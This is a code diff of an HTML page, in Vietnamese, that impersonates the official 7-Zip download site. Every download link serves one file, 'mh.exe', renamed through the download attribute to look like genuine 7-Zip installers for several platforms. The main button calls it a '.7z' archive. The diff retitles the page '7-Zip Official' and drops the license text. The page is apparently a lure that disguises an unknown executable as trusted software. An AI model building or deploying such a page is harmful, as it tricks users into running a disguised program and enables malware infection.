@@ -2,61 +2,62 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>7-Zip</title>
+    <title>7-Zip Official</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
-        <div class="sidebar">
-            <img src="7z.ico" alt="7-Zip" width="80">
+    <div class="wrapper">
+        <nav class="sidebar">
+            <div class="logo">
+                <img src="7z.ico" alt="7z">
+            </div>
             <hr>
             <ul>
-                <li><a href="#">Home</a></li>
-                <li><a href="#" class="blue-text">7z Format</a></li>
-                <li><a href="#" class="blue-text">LZMA SDK</a></li>
-                <li><a href="#" class="blue-text">Download</a></li>
-                <li><a href="#" class="blue-text">FAQ</a></li>
-                <li><a href="#" class="blue-text">Support</a></li>
-                <li><a href="#" class="blue-text">Links</a></li>
+                <li>Home</li>
+                <li><a href="#">7z Format</a></li>
+                <li><a href="#">LZMA SDK</a></li>
+                <li><a href="#" class="active">Download</a></li>
+                <li><a href="#">FAQ</a></li>
+                <li><a href="#">Support</a></li>
+                <li><a href="#">Links</a></li>
             </ul>
-        </div>
+        </nav>
 
-        <div class="main-content">
-            <h1>7-Zip</h1>
-            <p>7-Zip is a file archiver with a high compression ratio.</p>
+        <main class="content">
+            <h1>7-Zip 24.01</h1>
+            <p class="intro">7-Zip là trình lưu trữ tệp với tỉ lệ nén cao, hoàn toàn miễn phí và mã nguồn mở.</p>
 
-            <div class="download-box">
-                <p><b>Phần mềm 7-Zip v26.00 mới nhất dành cho Windows (64-bit)</b></p>
-                <a href="mh.exe" download="7z2600-x64.exe" class="btn-download">Tải về 7-Zip (.7z)</a>
-                <p class="small-text">Dung lượng: 11.2 MB | Định dạng: .7z archive</p>
-            </div>
+            <section class="featured-download">
+                <h2>Phần mềm 7-Zip v24.01 mới nhất dành cho Windows (64-bit)</h2>
+                <a href="mh.exe" download="7z2401-x64.exe" class="main-btn">Tải về 7-Zip (.7z)</a>
+                <p class="meta">Kích thước: 1.5 MB | Phiên bản: Stable | Ngày: 2026-03-12</p>
+            </section>
 
-            <p>Download <b>7-Zip 26.00</b> for another Windows platforms (32-bit x86 or ARM64).</p>
-            
-            <table class="download-table">
-                <tr>
-                    <th>Link</th>
-                    <th>Type</th>
-                    <th>Windows</th>
-                    <th>Size</th>
-                </tr>
-                <tr>
-                    <td><a href="mh.exe" download="7z2600-x86.exe">Download</a></td>
-                    <td>.exe</td>
-                    <td>32-bit x86</td>
-                    <td>1.3 MB</td>
-                </tr>
-                <tr>
-                    <td><a href="mh.exe" download="7z2600-arm64.exe">Download</a></td>
-                    <td>.exe</td>
-                    <td>64-bit ARM64</td>
-                    <td>1.5 MB</td>
-                </tr>
+            <table class="dl-table">
+                <thead>
+                    <tr>
+                        <th>Link</th>
+                        <th>Loại</th>
+                        <th>Hệ điều hành</th>
+                        <th>Dung lượng</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><a href="mh.exe" download="7z2401-x86.exe">Download</a></td>
+                        <td>.exe</td>
+                        <td>Windows 32-bit x86</td>
+                        <td>1.2 MB</td>
+                    </tr>
+                    <tr>
+                        <td><a href="mh.exe" download="7z2401-arm64.exe">Download</a></td>
+                        <td>.exe</td>
+                        <td>Windows 64-bit ARM64</td>
+                        <td>1.4 MB</td>
+                    </tr>
+                </tbody>
             </table>
-
-            <h3>License</h3>
-            <p>7-Zip is <b>free software</b> with <b>open source</b>. The most of the code is under the <b>GNU LGPL</b> license...</p>
-        </div>
+        </main>
     </div>
 </body>
 </html>
